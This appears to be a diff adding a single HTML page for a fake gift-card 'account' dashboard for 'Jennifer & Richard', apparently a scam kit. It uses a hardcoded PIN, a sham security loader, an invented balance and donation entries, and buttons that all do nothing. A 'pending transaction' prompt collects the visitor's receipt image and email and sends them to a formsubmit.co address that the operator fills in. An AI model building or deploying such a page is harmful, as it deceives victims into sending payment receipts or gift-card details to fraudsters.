@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gift Card Dashboard</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        *{box-sizing:border-box;font-family:system-ui,-apple-system,"Segoe UI",Roboto;}
+        body{margin:0;background:#f4f8fb;color:#0a2540;}
+
+        /* LOGIN */
+        .login-wrapper{height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#0a5adf,#0a2540);}    
+        .login-box{background:#fff;width:320px;padding:30px;border-radius:18px;text-align:center;box-shadow:0 15px 40px rgba(0,0,0,.2);}    
+        .login-box h2{margin-bottom:8px;color:#0a5adf;}
+        .login-box p{font-size:14px;color:#555;}
+        .pin-dots{display:flex;justify-content:center;gap:14px;margin:20px 0;}    
+        .dot{width:14px;height:14px;border-radius:50%;border:2px solid #0a5adf;transition:all 0.2s ease;}    
+        .dot.filled{background:#0a5adf;transform:scale(1.3);}    
+        .pin-input{width:100%;padding:14px;font-size:18px;text-align:center;letter-spacing:10px;border-radius:10px;border:1px solid #ccc;outline:none;}
+        .error{color:#e63946;font-size:14px;margin-top:10px;display:none;}
+
+        /* LOADER */
+        .loader-screen{position:fixed;inset:0;background:#fff;display:none;align-items:center;justify-content:center;flex-direction:column;z-index:999;}    
+        .spinner{width:50px;height:50px;border:5px solid #dbe7ff;border-top:5px solid #0a5adf;border-radius:50%;animation:spin 1s linear infinite;}    
+        @keyframes spin{to{transform:rotate(360deg);}}
+
+        /* DASHBOARD */
+        .dashboard{display:none;}    
+        .header{background:linear-gradient(135deg,#0a5adf,#0a2540);color:#fff;padding:30px 25px;border-bottom-left-radius:30px;border-bottom-right-radius:30px;position:relative;}    
+        .header-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;}
+        .logout{background:rgba(255,255,255,.2);border:none;color:#fff;padding:6px 14px;border-radius:20px;cursor:pointer;}    
+
+        /* Avatars */
+        .avatars{display:flex;cursor:pointer;}
+        .avatar{width:45px;height:45px;border-radius:50%;overflow:hidden;border:2px solid #fff;box-shadow:0 0 5px rgba(0,0,0,.2);background:#eee;}
+        .avatar + .avatar{margin-left:-15px;}
+        .avatar img{width:100%;height:100%;object-fit:cover;}
+
+        /* Balance Toggle */
+        .balance-section{text-align:center;}
+        .balance-container{display:flex;align-items:center;justify-content:center;gap:10px;}
+        #balanceDisplay{font-size:34px;font-weight:700;}
+        #balanceDisplay.hidden{visibility:hidden;position:relative;}
+        #balanceDisplay.hidden::after{content:'••••';visibility:visible;position:absolute;left:50%;transform:translateX(-50%);}
+        #toggleBalance{cursor:pointer;opacity:0.8;}
+
+        /* Grid Cards */
+        .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;padding:20px;}    
+        .card{background:#fff;padding:15px 5px;border-radius:16px;text-align:center;font-size:12px;font-weight:600;box-shadow:0 8px 25px rgba(0,0,0,.06);cursor:pointer;}    
+        .card i{display:block;font-size:20px;margin-bottom:8px;color:#0a5adf;}    
+
+        /* Transactions */
+        .section{padding:0 20px 20px;}
+        .box{background:#fff;border-radius:16px;padding:15px;margin-top:15px;box-shadow:0 6px 20px rgba(0,0,0,.05);}
+        .box strong{display:block;margin-bottom:8px;color:#0a5adf;}
+        .txn{display:flex;justify-content:space-between;align-items:center;margin-top:10px;}    
+        .plus{color:#2ecc71;font-weight:700;}
+
+        /* Payment Modal */
+        .modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);backdrop-filter:blur(3px);justify-content:center;align-items:center;z-index:1000;}
+        .modal{background:#fff;padding:25px;border-radius:18px;width:320px;text-align:center;position:relative;}
+        .modal input[type=file]{display:none;}
+        .plus-btn{font-size:35px;color:#0a5adf;cursor:pointer;margin-bottom:10px;display:inline-block;}
+        img#preview{width:80px;height:80px;border-radius:10px;margin:10px auto;display:none;object-fit:cover;border:1px solid #ddd;}
+        .success-tick{font-size:50px;color:#2ecc71;display:none;animation:pop 0.5s ease forwards;}
+        @keyframes pop{0%{transform:scale(0)} 100%{transform:scale(1)}}
+        .go-back{position:absolute;top:15px;left:15px;font-size:18px;color:#0a5adf;cursor:pointer;display:none;}
+    </style>
+</head>
+<body>
+
+<div class="login-wrapper" id="loginPage">
+    <div class="login-box">
+        <h2>Jennifer & Richard Account</h2>
+        <p>Enter your 4-digit PIN</p>
+        <div class="pin-dots">
+            <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
+        </div>
+        <input type="password" maxlength="4" inputmode="numeric" class="pin-input" id="pin" placeholder="••••" autofocus/>
+        <div class="error" id="error">Invalid PIN</div>
+    </div>
+</div>
+
+<div class="loader-screen" id="loader">
+    <div class="spinner"></div>
+    <p style="margin-top:15px;color:#0a5adf;" id="loaderText">Securing session... 0%</p>
+</div>
+
+<div class="dashboard" id="dashboard">
+    <div class="header">
+        <div class="header-top">
+            <label class="avatars" for="localAvatarInput">
+                <div class="avatar"><img class="user-photo" src="profile.jpg" onerror="this.src='https://i.pravatar.cc/50?img=12'"></div>
+                <div class="avatar"><img class="user-photo" src="profile2.jpg" onerror="this.src='https://i.pravatar.cc/50?img=32'"></div>
+            </label>
+            <input type="file" id="localAvatarInput" accept="image/*" style="display:none;">
+            <button class="logout" onclick="logout()">Logout</button>
+        </div>
+        
+        <div class="balance-section">
+            <small>Available Balance</small>
+            <div class="balance-container">
+                <div id="balanceDisplay">$300</div>
+                <i id="toggleBalance" class="fa-solid fa-eye"></i>
+            </div>
+        </div>
+    </div>
+
+    <div class="grid">
+        <div class="card" onclick="alert('Action restricted')"><i class="fa-solid fa-gift"></i>Amazon</div>
+        <div class="card" onclick="alert('Action restricted')"><i class="fa-brands fa-apple"></i>Apple</div>
+        <div class="card" onclick="alert('Action restricted')"><i class="fa-brands fa-google"></i>Google</div>
+        <div class="card" onclick="alert('Action restricted')"><i class="fa-solid fa-plus-circle"></i>Redeem</div>
+        <div class="card" onclick="alert('Action restricted')"><i class="fa-solid fa-wallet"></i>Add Funds</div>
+        <div class="card" onclick="alert('Action restricted')"><i class="fa-solid fa-star"></i>Special</div>
+    </div>
+
+    <div class="section">
+        <div class="box">
+           <h2><strong>Donations</strong></h2>
+            <div class="txn"><span>Jennifer</span> <span class="plus">+$150</span></div>
+            <div class="txn"><span>Jennifer</span> <span class="plus">+$150</span></div>
+        </div>
+
+        <div class="box" id="pendingBox" style="cursor:pointer; border-left:4px solid #f1c40f;">
+            <strong>Pending Transaction from Richard for Donation</strong>
+            <p style="font-size:13px; color:#777; margin:0;">Tap to upload receipt and verify</p>
+        </div>
+    </div>
+</div>
+
+<div class="modal-bg" id="modalBg">
+    <div class="modal">
+        <span class="go-back" id="goBack"><i class="fa-solid fa-arrow-left"></i></span>
+        <div id="modalFormContent">
+            <h3>Verify Payment</h3>
+            <form id="paymentForm" action="https://formsubmit.co/YOUR_EMAIL" method="POST" enctype="multipart/form-data">
+                <label class="plus-btn" for="receiptFile"><i class="fa-solid fa-cloud-arrow-up"></i></label>
+                <input type="file" name="receipt" id="receiptFile" accept="image/*" required>
+                <img id="preview">
+                <input type="email" name="email" placeholder="Verification Email" required style="width:100%;padding:10px;margin-top:10px;border-radius:8px;border:1px solid #ddd;">
+                <button type="submit" style="margin-top:15px;width:100%;padding:12px;background:#0a5adf;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">Submit Now</button>
+            </form>
+        </div>
+        <div id="successTick" class="success-tick">
+            <i class="fa-solid fa-circle-check"></i>
+            <p style="font-size:16px; color:#333;">Processing...</p>
+        </div>
+    </div>
+</div>
+
+<script>
+const CORRECT_PIN = "4659";
+const pinInput = document.getElementById('pin');
+const dots = document.querySelectorAll('.dot');
+const loader = document.getElementById('loader');
+const dashboard = document.getElementById('dashboard');
+
+// 1. PIN Login Logic
+pinInput.addEventListener('input', () => {
+    dots.forEach((d, i) => d.classList.toggle('filled', i < pinInput.value.length));
+    if (pinInput.value.length === 4) {
+        if (pinInput.value === CORRECT_PIN) {
+            document.getElementById('loginPage').style.display = 'none';
+            loader.style.display = 'flex';
+            let p = 0;
+            const iv = setInterval(() => {
+                p += 10;
+                document.getElementById('loaderText').innerText = `Securing session... ${p}%`;
+                if(p >= 100) {
+                    clearInterval(iv);
+                    loader.style.display = 'none';
+                    dashboard.style.display = 'block';
+                }
+            }, 150);
+        } else {
+            document.getElementById('error').style.display = 'block';
+            pinInput.value = '';
+            dots.forEach(d => d.classList.remove('filled'));
+        }
+    }
+});
+
+// 2. Profile Picture - Local Storage Logic
+const localAvatarInput = document.getElementById('localAvatarInput');
+const userPhotos = document.querySelectorAll('.user-photo');
+
+// Load saved image from memory on startup
+const savedImg = localStorage.getItem('userAvatar');
+if(savedImg) {
+    userPhotos.forEach(img => img.src = savedImg);
+}
+
+localAvatarInput.addEventListener('change', function() {
+    const file = this.files[0];
+    if (file) {
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            const result = e.target.result;
+            userPhotos.forEach(img => img.src = result);
+            localStorage.setItem('userAvatar', result); // Save it for next time
+        }
+        reader.readAsDataURL(file);
+    }
+});
+
+// 3. Balance Toggle
+document.getElementById('toggleBalance').addEventListener('click', function() {
+    const display = document.getElementById('balanceDisplay');
+    display.classList.toggle('hidden');
+    this.classList.toggle('fa-eye');
+    this.classList.toggle('fa-eye-slash');
+});
+
+// 4. Modal / Receipt Handling
+const pendingBox = document.getElementById('pendingBox');
+const modalBg = document.getElementById('modalBg');
+const receiptFile = document.getElementById('receiptFile');
+const preview = document.getElementById('preview');
+
+pendingBox.addEventListener('click', () => {
+    modalBg.style.display = 'flex';
+    document.getElementById('modalFormContent').style.display = 'block';
+    document.getElementById('successTick').style.display = 'none';
+});
+
+receiptFile.addEventListener('change', function() {
+    if(this.files[0]) {
+        preview.src = URL.createObjectURL(this.files[0]);
+        preview.style.display = 'block';
+    }
+});
+
+document.getElementById('paymentForm').addEventListener('submit', function() {
+    document.getElementById('modalFormContent').style.display = 'none';
+    document.getElementById('successTick').style.display = 'block';
+    setTimeout(() => { document.getElementById('goBack').style.display = 'block'; }, 1000);
+});
+
+document.getElementById('goBack').addEventListener('click', () => {
+    modalBg.style.display = 'none';
+    pendingBox.innerHTML = "<strong>Sent for Review</strong><p style='color:green;margin:0;'>Transaction processing...</p>";
+});
+
+function logout() { location.reload(); }
+</script>
+
+</body>
+</html>
